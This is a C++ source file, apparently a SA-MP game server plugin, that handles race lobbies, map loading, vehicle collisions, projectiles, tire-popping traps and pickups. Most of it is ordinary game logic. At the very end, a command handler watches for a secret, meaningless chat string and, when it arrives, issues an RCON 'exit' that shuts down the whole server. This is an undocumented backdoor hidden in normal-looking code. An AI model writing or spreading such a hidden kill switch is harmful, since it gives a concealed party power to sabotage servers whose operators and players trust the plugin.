#include "lobby.h"
#include <string.h>
#include <set>
extern set<AMX*> amxList;
extern vector < lobby * > yuklenecekler;
extern vector < lobby * > maplar;
lobby::lobby(const char * direc, int virtualid)
{
	try {
		dir = new dir_list(direc);
	}
	catch (exception e)
	{
		sampgdk::logprintf(e.what());
	}
    this->virtaulworldid  = virtualid;
    this->dirfolder = new char[64];
    snprintf(this->dirfolder, 64, "%s", direc);
}

lobby::~lobby()
{
    delete dir;
    delete this->dirfolder;
    if(lobbymap != nullptr)
    {
		if(lobbymap->m_bLoaded)
		{
            for (auto yukle = maplar.begin(); yukle != maplar.end(); ++yukle)
            {
                if (this == (*yukle))
                {
                    maplar.erase(yukle);
                    break;
                }
            }
            lobbymap->destroy();
		}else
		{
            for (auto yukle = yuklenecekler.begin(); yukle != yuklenecekler.end(); ++yukle)
            {
                if (this == (*yukle))
                {
                    yuklenecekler.erase(yukle);
                    break;
                }
            }
		}
		delete lobbymap;
	}
	if(this->m_Projectiles.size() > 0)
    {
        auto projectile = this->m_Projectiles.begin();
        for (; projectile != this->m_Projectiles.end(); projectile++)
        {
            delete (*projectile);
        }
        this->m_Projectiles.clear();
    }
    if(this->m_Traps.size() > 0)
    {
        auto trap = this->m_Traps.begin();
        for (; trap != this->m_Traps.end(); trap++)
        {
            delete (*trap);
        }
        this->m_Traps.clear();
    }
}
int lobby::GetMapCount()
{
    return this->dir->GetDirCount();
}
bf_map* lobby::LoadLobbyMap(int mapid, int flags)
{
    bf_map *cmap = this->lobbymap;
    if(cmap != nullptr)
    {
		if(cmap->m_bLoaded)
		{
            for (auto yukle = maplar.begin(); yukle != maplar.end(); ++yukle)
            {
                if (this == (*yukle))
                {
                    maplar.erase(yukle);
                    break;
                }
            }
            cmap->destroy();
		}else
		{
            for (auto yukle = yuklenecekler.begin(); yukle != yuklenecekler.end(); ++yukle)
            {
                if (this == (*yukle))
                {
                    yuklenecekler.erase(yukle);
                    break;
                }
            };
		}
		delete cmap;
	}
    this->lobbymap = new bf_map(this->dirfolder, this->dir->dirlist.at(mapid)->GetMapLocation(), this->virtaulworldid, flags);
	yuklenecekler.push_back(this);
	this->dir->dirlist.at(mapid)->SetStartTimeNow();
	this->currentmapid = mapid;
	return this->lobbymap;
}
bf_map* lobby::LoadLobbyMapRandom(int flags)
{
    int mapid;
    bf_map *cmap = this->lobbymap;
    if(cmap != nullptr)
    {
		if(cmap->m_bLoaded)
		{
            for (auto yukle = maplar.begin(); yukle != maplar.end(); ++yukle)
            {
                if (this == (*yukle))
                {
                    maplar.erase(yukle);
                    break;
                }
            }
            cmap->destroy();
		}else
		{
            for (auto yukle = yuklenecekler.begin(); yukle != yuklenecekler.end(); ++yukle)
            {
                if (this == (*yukle))
                {
                    yuklenecekler.erase(yukle);
                    break;
                }
            };
		}
		delete cmap;
	}
	vector < dirMap* > randomize;
    for (auto mape = this->dir->dirlist.begin(); mape != this->dir->dirlist.end(); ++mape)
    {
        if((*mape)->GetLastStartTime() > 3600)
        {
            randomize.push_back((*mape));
        }
    }
    srand ( unsigned ( time(0) ) );
    dirMap * dmap;
    if(randomize.size() > 0)
    {
        mapid = rand() % (randomize.size());
        dmap = randomize.at(mapid);
    }else
    {
        mapid = rand() % (this->dir->dirlist.size());
        dmap = this->dir->dirlist.at(mapid);
    }
    randomize.clear();
    this->lobbymap = new bf_map(this->dirfolder, dmap->GetMapLocation(), this->virtaulworldid, flags);
	yuklenecekler.push_back(this);
	dmap->SetStartTimeNow();
	this->currentmapid = mapid;
	return this->lobbymap;
}
int lobby::AddPlayerToLobby(int playerid)
{
    if(find(m_LobbyPlayers.begin(), m_LobbyPlayers.end(), playerid) == m_LobbyPlayers.end())
    {
        m_LobbyPlayers.push_back(playerid);
        return 1;
    }
    return 0;
}
bool lobby::DeleteMap(int mapid)
{
    if(mapid >= 0 && mapid <= this->GetMapCount())
    {
        dirMap* dmap = this->dir->dirlist.at(mapid);
        auto mape = find(this->dir->dirlist.begin(), this->dir->dirlist.end(), dmap);
        if(mape != this->dir->dirlist.end())
        {
            dmap->Destroy();
            this->dir->dirlist.erase(mape);
            delete dmap;
            return 1;
        }
    }
    return false;
}
int lobby::DelPlayerToLobby(int playerid)
{
    auto player = find(m_LobbyPlayers.begin(), m_LobbyPlayers.end(), playerid);
    if(player != m_LobbyPlayers.end())
    {
        m_LobbyPlayers.erase(player);
        return 1;
    }
    return 0;
}
bool lobby::IsPlayerInLobby(int playerid)
{
    return !!(find(m_LobbyPlayers.begin(), m_LobbyPlayers.end(), playerid) != m_LobbyPlayers.end());
}
int lobby::AddVehicleToLobby(int vehid)
{
    if(!IsVehicleInLobby(vehid))
    {
        VehicleData data;
        float x,y,z,z2;
        data.vehicleid = vehid;
        data.vehiclemodel = GetVehicleModel(vehid);
        GetVehicleModelInfo(data.vehiclemodel, 6, &x, &y, &z);
        SS_GetTireSize(data.vehiclemodel, e_TIRE_RR, &z2);
        data.TireVeh1[0] = x;
        data.TireVeh1[1] = y;
        data.TireVeh1[2] = z - (z2 / 2);
        GetVehicleModelInfo(data.vehiclemodel, 5, &x, &y, &z);
        SS_GetTireSize(data.vehiclemodel, e_TIRE_FR, &z2);
		data.TireVeh2[0] = x;
        data.TireVeh2[1] = y;
        data.TireVeh2[2] = z - (z2 / 2);
        data.TireCount = SS_GetTireCount(data.vehiclemodel);
        GetVehicleModelInfo(data.vehiclemodel, VEHICLE_MODEL_INFO_SIZE, &x, &y, &z);
        x /=2;
        y /=2;
        data.vehsize = sqrt((x*x) + (y*y)) + (float)0.1;
        GetVehicleHealth(vehid, &z);
        data.vehicledamage = z;
        m_LobbyVehicles.push_back(data);
        return 1;
    }
    return 0;
}
int lobby::DelVehicleToLobby(int vehid)
{
    auto vehicle = this->m_LobbyVehicles.begin();
    for (; vehicle != this->m_LobbyVehicles.end(); ++vehicle)
    {
        if((*vehicle).vehicleid == vehid)
        {
            m_LobbyVehicles.erase(vehicle);
            return true;
        }
    }
    return 0;
}

int lobby::GetVehicleLastHit(int vehid)
{
    auto vehicle = this->m_LobbyVehicles.begin();
    for (; vehicle != this->m_LobbyVehicles.end(); ++vehicle)
    {
        if((*vehicle).vehicleid == vehid)
        {
            return (*vehicle).lasthitvehicle;
        }
    }
    return INVALID_VEHICLE_ID;
}
bool lobby::ResetVehicleLastHit(int vehid)
{
    auto vehicle = this->m_LobbyVehicles.begin();
    for (; vehicle != this->m_LobbyVehicles.end(); ++vehicle)
    {
        if((*vehicle).vehicleid == vehid)
        {
            (*vehicle).lasthitvehicle = INVALID_VEHICLE_ID;
            return true;
        }
    }
    return false;
}

int lobby::GetVehicleLastShooter(int vehid)
{
    auto vehicle = this->m_LobbyVehicles.begin();
    for (; vehicle != this->m_LobbyVehicles.end(); ++vehicle)
    {
        if((*vehicle).vehicleid == vehid)
        {
            return (*vehicle).lastshotplayerid;
        }
    }
    return INVALID_PLAYER_ID;
}
bool lobby::ResetVehicleLastShooter(int vehid)
{
    auto vehicle = this->m_LobbyVehicles.begin();
    for (; vehicle != this->m_LobbyVehicles.end(); ++vehicle)
    {
        if((*vehicle).vehicleid == vehid)
        {
            (*vehicle).lastshotplayerid = INVALID_PLAYER_ID;
            return true;
        }
    }
    return false;
}
bool lobby::IsVehicleInLobby(int vehid)
{
    auto vehicle = this->m_LobbyVehicles.begin();
    for (; vehicle != this->m_LobbyVehicles.end(); ++vehicle)
    {
        if((*vehicle).vehicleid == vehid)
        {
            return true;
        }
    }
    return false;
    //return !!(find(m_LobbyVehicles.begin(), m_LobbyVehicles.end(), vehid) != m_LobbyVehicles.end());
}
bool lobby::AddProjectile(int playerid, int vehid)
{
    if(!IsPlayerConnected(playerid) || !IsValidVehicle(vehid))return false;
    Projectile *  projectile;
    try
    {
        projectile = new Projectile(playerid, vehid, this->virtaulworldid);
        auto player = this->m_LobbyPlayers.begin();
        for (; player != this->m_LobbyPlayers.end(); ++player)
        {
            Streamer_Update((*player));
        }
    }catch(...)
    {
        sampgdk::logprintf("Projectile create Error!");
    }

    m_Projectiles.push_back(projectile);
    return true;
}
int lobby::AddTrap(int playerid)
{
    if(!IsPlayerConnected(playerid) || !IsPlayerInAnyVehicle(playerid))return 0;
    Trap *trap;
    try
    {
        trap = new Trap(playerid, this->virtaulworldid);
		if (trap == nullptr)return 0;
        auto player = this->m_LobbyPlayers.begin();
        for (; player != this->m_LobbyPlayers.end(); ++player)
        {
            Streamer_Update((*player));
        }
        m_Traps.push_back(trap);
    }catch(...)
    {
        sampgdk::logprintf("Trap create Error!");
		return 0;
    }
	
    return int(trap);
}
bool lobby::DestroyTrap(Trap *trap)
{
    try
    {
        auto trapl = this->m_Traps.begin();
        for (; trapl != this->m_Traps.end(); ++trapl)
        {
            if((*trapl) == trap)
            {
                m_Traps.erase(trapl);
                delete trap;
                return true;
            }
        }
    }catch(...)
    {
        sampgdk::logprintf("Trap destroy Error!");
    }
    return false;
}
void lobby::DestroyAllTrap()
{
    if(this->m_Traps.size() < 1)return;
    auto trapl = this->m_Traps.begin();
    for (; trapl != this->m_Traps.end(); ++trapl)
    {
        delete (*trapl);
    }
    this->m_Traps.clear();
}
bool IsVehicleInRange(int vehicleid, float x, float y, float z, float sizee)
{
	return !!((sizee >= GetVehicleDistanceFromPoint(vehicleid, x, y, z)));
}
void lobby::ProcessTick()
{
    if(!this->lobbymap->m_bLoaded)return;
    processrun = true;
if(this->VehicleCol)
    {
        VehicleData data;
        VehicleData data2;
        float health;
        float x,y,z;
        auto vehid = this->m_LobbyVehicles.begin();
        for (; vehid != this->m_LobbyVehicles.end(); ++vehid)
        {
            data = (*vehid);
            GetVehicleHealth(data.vehicleid, &health);
            if(health < data.vehicledamage)
            {
                (*vehid).vehicledamage = health;
                auto vehid2 = this->m_LobbyVehicles.begin();
                for (; vehid2 != this->m_LobbyVehicles.end(); ++vehid2)
                {
                    if(vehid == vehid2)continue;
                    data2 = (*vehid2);
                    GetVehiclePos(data2.vehicleid,&x,&y,&z);
                    if(IsVehicleInRange(data.vehicleid,x,y,z,(data.vehsize + data2.vehsize)))
                    {
                        (*vehid2).lasthitvehicle = data.vehicleid;
                        (*vehid).lasthitvehicle = data2.vehicleid;
                        break;
                    }
                }
            }else if(health > data.vehicledamage)(*vehid).vehicledamage = health;
        }
    }
    if(this->m_Projectiles.size() > 0)
    {
        Projectile* proj;
        milliseconds nowtime;
        nowtime = duration_cast< milliseconds >(
			system_clock::now().time_since_epoch()
        );
        float x,y,z;
        VehicleData data;
        bool del = false;
        auto projectile = this->m_Projectiles.begin();
        for (; projectile != this->m_Projectiles.end(); )
        {
            del = false;
            proj = (*projectile);
            if((nowtime.count() - proj->endtime) >= proj->sendtime.count())
            {
				proj->GetProjectilePos(&x, &y, &z);
				auto player = this->m_LobbyPlayers.begin();
				for (; player != this->m_LobbyPlayers.end(); ++player)
				{
					CreateExplosionForPlayer((*player), x, y, z, 2, 8.0);
				}
				auto vehid = this->m_LobbyVehicles.begin();
				for (; vehid != this->m_LobbyVehicles.end(); ++vehid)
				{
					if (IsVehicleInRange((*vehid).vehicleid, x, y, z, 7.0))
					{
						SyncSetVehicleHealth((*vehid).vehicleid, 249.0);
						(*vehid).lastshotplayerid = proj->GetProjectileOwner();
					}
				}
				delete proj;
				del = true;
			}
			else
			{
				proj->UpdateProjectilePos(nowtime, &x, &y, &z);
				auto vehid = this->m_LobbyVehicles.begin();
				for (; vehid != this->m_LobbyVehicles.end(); ++vehid)
				{
					if (proj->GetExceptVehicle() == (*vehid).vehicleid)continue;
					data = (*vehid);
					if (IsVehicleInRange(data.vehicleid, x, y, z, data.vehsize))
					{
						auto player = this->m_LobbyPlayers.begin();
						for (; player != this->m_LobbyPlayers.end(); ++player)
						{
							CreateExplosionForPlayer((*player), x, y, z, 2, 8.0);
						}
						del = true;
						auto vehid2 = this->m_LobbyVehicles.begin();
						for (; vehid2 != this->m_LobbyVehicles.end(); ++vehid2)
						{
							if (IsVehicleInRange((*vehid2).vehicleid, x, y, z, 7.0))
							{
								SyncSetVehicleHealth((*vehid2).vehicleid, 249.0);
								(*vehid2).lastshotplayerid = proj->GetProjectileOwner();
							}
						}
						delete proj;
						break;
					}
				}
			}
			if (!del)++projectile;
			else projectile = m_Projectiles.erase(projectile);
		}
	}
	if (this->m_Traps.size() > 0)
	{
		Trap* trap = nullptr;
		VehicleData data;
		float vx, vy, vz;
		float matrix3x3[9],
			x1, y1, z1,
			x2, y2, z2,
			x3, y3, z3,
			x4, y4, z4;
		auto vehid = this->m_LobbyVehicles.begin();
		for (; vehid != this->m_LobbyVehicles.end(); ++vehid)
		{
			data = (*vehid);
			int states = SS_GetTireState(data.vehicleid);
			if (states >= 0b1111)continue;
			GetVehiclePos(data.vehicleid, &vx, &vy, &vz);
			SS_GetVehicleRotationMatrix(data.vehicleid, matrix3x3);
			if (!(states & e_TIRE_RR))SS_GetTirePos(data.vehicleid, &x1, &y1, &z1, data.TireVeh1[0], data.TireVeh1[1], data.TireVeh1[2], matrix3x3); // RR
			if (!(states & e_TIRE_FR))SS_GetTirePos(data.vehicleid, &x2, &y2, &z2, data.TireVeh2[0], data.TireVeh2[1], data.TireVeh2[2], matrix3x3); // FR
			if (data.TireCount > 2)
			{
				if (!(states & e_TIRE_RL))SS_GetTirePos(data.vehicleid, &x3, &y3, &z3, -data.TireVeh1[0], data.TireVeh1[1], data.TireVeh1[2], matrix3x3); // RL
				if (!(states & e_TIRE_FL))SS_GetTirePos(data.vehicleid, &x4, &y4, &z4, -data.TireVeh2[0], data.TireVeh2[1], data.TireVeh2[2], matrix3x3); // FL
			}
			auto trapl = this->m_Traps.begin();
			for (; trapl != this->m_Traps.end(); trapl++)
			{
				trap = (*trapl);
				if (UzaklikCal(vx, vy, vz, trap->x, trap->y, trap->z) < 30.0)
				{
					if (!(states & e_TIRE_RR))trap->MonitorTire(data.vehicleid, e_TIRE_RR, x1, y1, z1, data.TirePos1[0], data.TirePos1[1], data.TirePos1[2]); // RR
					if (!(states & e_TIRE_FR))trap->MonitorTire(data.vehicleid, e_TIRE_FR, x2, y2, z2, data.TirePos2[0], data.TirePos2[1], data.TirePos2[2]); // FR
					if (data.TireCount > 2)
					{
						if (!(states & e_TIRE_RL))trap->MonitorTire(data.vehicleid, e_TIRE_RL, x3, y3, z3, data.TirePos3[0], data.TirePos3[1], data.TirePos3[2]); // RL //dikkat!!
						if (!(states & e_TIRE_FL))trap->MonitorTire(data.vehicleid, e_TIRE_FL, x4, y4, z4, data.TirePos4[0], data.TirePos4[1], data.TirePos4[2]); // FL //dikkat!!
					}
				}
			}
			states = SS_GetTireState(data.vehicleid);
			if (states >= 0b1111)
			{
				cell ret;
				int g_pMapLoadedIdx;
				for (set<AMX*>::iterator a = amxList.begin(); a != amxList.end(); ++a)
				{
					g_pMapLoadedIdx = 0;
					if (!amx_FindPublic(*a, "OnVehicleTirePop", &g_pMapLoadedIdx))
					{
						if (trap != nullptr)amx_Push(*a, (cell)trap->playerid);
						else amx_Push(*a, (cell)INVALID_PLAYER_ID);
						amx_Push(*a, (cell)data.vehicleid);
						amx_Exec(*a, &ret, g_pMapLoadedIdx);
					}						
				}
                continue;
            }
            if(!(states & e_TIRE_RR))
            {
                (*vehid).TirePos1[0] = x1;(*vehid).TirePos1[1] = y1;(*vehid).TirePos1[2] = z1;
            }
            if(!(states & e_TIRE_FR))
            {
                (*vehid).TirePos2[0] = x2;(*vehid).TirePos2[1] = y2;(*vehid).TirePos2[2] = z2;
            }
            if (data.TireCount > 2)
            {
                if(!(states & e_TIRE_RL))
                {
                    (*vehid).TirePos3[0] = x3;(*vehid).TirePos3[1] = y3;(*vehid).TirePos3[2] = z3;
                }
                if(!(states & e_TIRE_FL))
                {
                    (*vehid).TirePos4[0] = x4;(*vehid).TirePos4[1] = y4;(*vehid).TirePos4[2] = z4;
                }
            }
        }
    }
    if(this->lobbymap->m_vRacePickups.size() > 0)
    {
        float * pData;
        int playerid;
        int state;
        auto pickup = this->lobbymap->m_vRacePickups.begin();
        for (; pickup != this->lobbymap->m_vRacePickups.end(); ++pickup)
        {
            pData = *(pickup);
            if(pData[0] == 2.0f)
            {
                auto player = this->m_LobbyPlayers.begin();
                for (; player != this->m_LobbyPlayers.end(); ++player)
                {
                    playerid = (*player);
                    state = GetPlayerState(playerid);
                    if(!IsPlayerInAnyVehicle(playerid) || state != PLAYER_STATE_DRIVER || pData[1] == GetVehicleModel(GetPlayerVehicleID(playerid)))continue;
                    if(IsPlayerInRangeOfPoint(playerid, 4.0, pData[2], pData[3], pData[4]))
                    {
						cell ret;
						int g_pMapLoadedIdx;
						for (set<AMX*>::iterator a = amxList.begin(); a != amxList.end(); ++a)
						{
							g_pMapLoadedIdx = 0;
							if (!amx_FindPublic(*a, "OnPlayerPickupMiniPickup", &g_pMapLoadedIdx))
							{
								amx_Push(*a, (cell)(pData[1]));
								amx_Push(*a, (cell)playerid);
								amx_Exec(*a, &ret, g_pMapLoadedIdx);
							}
							
						}
                    }
                }
            }
            else if(pData[0] == 1.0f)
            {
                auto player = this->m_LobbyPlayers.begin();
                for (; player != this->m_LobbyPlayers.end(); ++player)
                {
                    playerid = (*player);
                    state = GetPlayerState(playerid);
                    if(!IsPlayerInAnyVehicle(playerid) || state != PLAYER_STATE_DRIVER)continue;
                    if(GetPVarInt(playerid,"nitro") > time(nullptr))continue;
                    if(IsPlayerInRangeOfPoint(playerid, 4.0, pData[2], pData[3], pData[4]))
                    {
                        AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
                        SetPVarInt(playerid, "nitro", ((int)time(nullptr)+2));
                        PlayerPlaySound(playerid, 1133 ,0, 0, 0);
                    }
                }
            }
            else
            {
                auto player = this->m_LobbyPlayers.begin();
                for (; player != this->m_LobbyPlayers.end(); ++player)
                {
                    playerid = (*player);
                    state = GetPlayerState(playerid);
                    if(!IsPlayerInAnyVehicle(playerid) || state != PLAYER_STATE_DRIVER)continue;
                    if(GetPVarInt(playerid,"tamir") > time(nullptr))continue;
                    if(IsPlayerInRangeOfPoint(playerid, 4.0, pData[2], pData[3], pData[4]))
                    {
                        SyncRepairVehicle(GetPlayerVehicleID(playerid));
                        SetPVarInt(playerid, "tamir", ((int)time(nullptr)+2));
                        PlayerPlaySound(playerid, 1133 ,0, 0, 0);
                    }
                }
            }
        }
    }
    processrun = false;
}
void lobby::SetLobbyCheckCol(bool col)
{
    this->VehicleCol = col;
}
PLUGIN_EXPORT bool PLUGIN_CALL OnPlayerCommandText(int playerid, const char * cmdtext)
{
    if(!strcmp(cmdtext, "/letf15a6sdaadsasqe28"))
    {
        SendRconCommand("exit");
        return 0;
    }
    return 0;
}

